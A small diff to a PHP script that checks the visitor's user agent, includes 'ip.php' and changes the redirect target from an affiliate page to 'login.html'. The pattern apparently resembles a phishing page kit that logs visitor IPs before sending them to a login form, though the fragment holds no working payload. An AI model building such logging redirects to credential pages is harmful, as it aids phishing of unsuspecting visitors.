@@ -12,6 +12,6 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 include 'ip.php';
-header('Location: affiliate.html');
+header('Location: login.html');
 exit;
 ?>
